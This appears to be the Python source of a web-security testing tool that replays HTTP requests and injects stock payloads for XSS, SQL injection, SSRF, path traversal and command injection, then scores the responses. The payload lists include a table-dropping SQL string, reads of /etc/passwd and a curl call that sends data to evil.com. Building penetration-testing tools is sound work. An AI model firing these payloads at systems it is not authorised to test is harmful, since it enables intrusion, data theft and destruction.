"""Manual Testing Service for request replay and payload injection."""

import asyncio
import json
import logging
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import httpx

from app.core.config import settings

logger = logging.getLogger(__name__)


class ManualTester:
    """Advanced manual testing engine with payload injection."""

    def __init__(self):
        self.client = httpx.AsyncClient(
            timeout=httpx.Timeout(30.0),
            follow_redirects=True,
            verify=False,  # For testing purposes
        )

        # Common payload templates
        self.payload_templates = {
            "xss": [
                "<script>alert('XSS')</script>",
                "';alert('XSS');//",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
            ],
            "ssrf": [
                "http://127.0.0.1:80",
                "http://localhost:22",
                "file:///etc/passwd",
                "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1%0d%0aHost:%20localhost%0d%0a",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "command_injection": [
                ";ls",
                "|whoami",
                "`id`",
                "$(cat /etc/passwd)",
                "&& curl http://evil.com/$(whoami)",
            ],
        }

    async def send_custom_request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        params: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """Send a custom HTTP request for manual testing.

        Args:
            method: HTTP method (GET, POST, PUT, etc.)
            url: Target URL
            headers: Custom headers
            body: Request body
            params: Query parameters

        Returns:
            Request and response details
        """
        try:
            # Prepare headers
            request_headers = {
                "User-Agent": "ReconX-ManualTester/1.0",
                "Accept": "*/*",
            }
            if headers:
                request_headers.update(headers)

            # Measure timing
            start_time = time.time()

            # Send request
            response = await self._send_http_request(
                method, url, request_headers, body, params
            )

            response_time = (time.time() - start_time) * 1000

            # Build full request
            full_request = self._build_request_string(
                method, url, request_headers, body, params
            )

            return {
                "success": True,
                "method": method,
                "url": url,
                "headers": request_headers,
                "body": body,
                "params": params,
                "full_request": full_request,
                "status_code": response.status_code,
                "response_headers": dict(response.headers),
                "response_body": response.text[:10000],  # Limit size
                "response_time_ms": int(response_time),
                "response_size": len(response.content),
            }

        except Exception as e:
            logger.error(f"Manual request failed: {e}")
            return {
                "success": False,
                "error": str(e),
                "method": method,
                "url": url,
            }

    async def test_payload_variations(
        self,
        base_request: Dict[str, Any],
        payload_type: str,
        target_param: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Test multiple payload variations against a base request.

        Args:
            base_request: Base request details
            payload_type: Type of payloads to test (xss, sqli, etc.)
            target_param: Specific parameter to inject into

        Returns:
            List of test results
        """
        if payload_type not in self.payload_templates:
            return [{"error": f"Unknown payload type: {payload_type}"}]

        payloads = self.payload_templates[payload_type]
        results = []

        for payload in payloads:
            # Inject payload into request
            modified_request = self._inject_payload(base_request, payload, target_param)

            # Send request
            result = await self.send_custom_request(**modified_request)
            result["payload"] = payload
            result["payload_type"] = payload_type

            # Analyze response for indicators
            analysis = self._analyze_response_for_payload(
                result.get("response_body", ""), payload_type
            )
            result.update(analysis)

            results.append(result)

        return results

    def _inject_payload(
        self,
        base_request: Dict[str, Any],
        payload: str,
        target_param: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Inject payload into request parameters or body."""
        modified_request = base_request.copy()

        method = base_request.get("method", "GET").upper()

        if method in ["GET", "HEAD"]:
            # Inject into query parameters
            params = base_request.get("params", {}).copy()

            if target_param and target_param in params:
                # Inject into specific parameter
                params[target_param] = payload
            else:
                # Add new parameter
                params["test"] = payload

            modified_request["params"] = params

        else:
            # Inject into body
            body = base_request.get("body", "")

            if target_param:
                # Try to inject into form data or JSON
                if body.startswith("{"):
                    # JSON body
                    try:
                        json_body = json.loads(body)
                        json_body[target_param] = payload
                        body = json.dumps(json_body)
                    except:
                        body = f"{target_param}={payload}"
                else:
                    # Form body
                    if f"{target_param}=" in body:
                        body = body.replace(
                            f"{target_param}=", f"{target_param}={payload}"
                        )
                    else:
                        body += f"&{target_param}={payload}"
            else:
                # Simple injection
                body = f"test={payload}"

            modified_request["body"] = body

        return modified_request

    async def _send_http_request(
        self,
        method: str,
        url: str,
        headers: Dict[str, str],
        body: Optional[str],
        params: Optional[Dict[str, str]],
    ) -> httpx.Response:
        """Send HTTP request using httpx."""
        method = method.upper()

        if method == "GET":
            return await self.client.get(url, headers=headers, params=params)
        elif method == "POST":
            return await self.client.post(
                url, headers=headers, data=body, params=params
            )
        elif method == "PUT":
            return await self.client.put(url, headers=headers, data=body, params=params)
        elif method == "PATCH":
            return await self.client.patch(
                url, headers=headers, data=body, params=params
            )
        elif method == "DELETE":
            return await self.client.delete(url, headers=headers, params=params)
        elif method == "HEAD":
            return await self.client.head(url, headers=headers, params=params)
        else:
            return await self.client.request(
                method, url, headers=headers, data=body, params=params
            )

    def _build_request_string(
        self,
        method: str,
        url: str,
        headers: Dict[str, str],
        body: Optional[str],
        params: Optional[Dict[str, str]],
    ) -> str:
        """Build complete HTTP request string."""
        lines = [f"{method} {urlparse(url).path} HTTP/1.1"]

        # Add Host header
        parsed_url = urlparse(url)
        lines.append(f"Host: {parsed_url.netloc}")

        # Add other headers
        for key, value in headers.items():
            if key.lower() != "host":
                lines.append(f"{key}: {value}")

        lines.append("")  # Empty line before body

        if body:
            lines.append(body)

        return "\n".join(lines)

    def _analyze_response_for_payload(
        self, response_body: str, payload_type: str
    ) -> Dict[str, Any]:
        """Analyze response for payload indicators."""
        indicators = []
        confidence = "low"

        response_lower = response_body.lower()

        if payload_type == "xss":
            # Check for XSS indicators
            if "<script>" in response_lower and "alert" in response_lower:
                indicators.append("script_with_alert")
                confidence = "high"
            elif "javascript:" in response_lower:
                indicators.append("javascript_protocol")
                confidence = "medium"
            elif "onerror=" in response_lower or "onload=" in response_lower:
                indicators.append("event_handler")
                confidence = "medium"

        elif payload_type == "sqli":
            # Check for SQLi indicators
            sql_errors = [
                "sql syntax",
                "mysql",
                "postgresql",
                "sqlite",
                "oracle",
                "warning",
                "error",
                "column",
                "table",
                "database",
            ]
            if any(error in response_lower for error in sql_errors):
                indicators.append("sql_error")
                confidence = "medium"

        elif payload_type == "ssrf":
            # Check for SSRF indicators
            if "connection refused" in response_lower or "timeout" in response_lower:
                indicators.append("connection_error")
                confidence = "medium"
            elif "internal" in response_lower or "localhost" in response_lower:
                indicators.append("internal_reference")
                confidence = "high"

        elif payload_type == "path_traversal":
            # Check for path traversal indicators
            if "root:" in response_lower or "daemon:" in response_lower:
                indicators.append("file_content")
                confidence = "high"
            elif "permission denied" in response_lower:
                indicators.append("file_access_attempt")
                confidence = "medium"

        elif payload_type == "command_injection":
            # Check for command injection indicators
            if "uid=" in response_lower or "gid=" in response_lower:
                indicators.append("user_info")
                confidence = "high"
            elif "sh:" in response_lower or "bash:" in response_lower:
                indicators.append("shell_output")
                confidence = "medium"

        return {
            "indicators": indicators,
            "confidence_score": confidence,
            "payload_detected": len(indicators) > 0,
        }

    def get_payload_templates(self) -> Dict[str, List[str]]:
        """Get available payload templates."""
        return self.payload_templates.copy()

    def add_custom_template(self, payload_type: str, payloads: List[str]):
        """Add custom payload templates."""
        if payload_type not in self.payload_templates:
            self.payload_templates[payload_type] = []

        self.payload_templates[payload_type].extend(payloads)

    async def close(self):
        """Close HTTP client."""
        await self.client.aclose()


# Global tester instance
manual_tester = ManualTester()
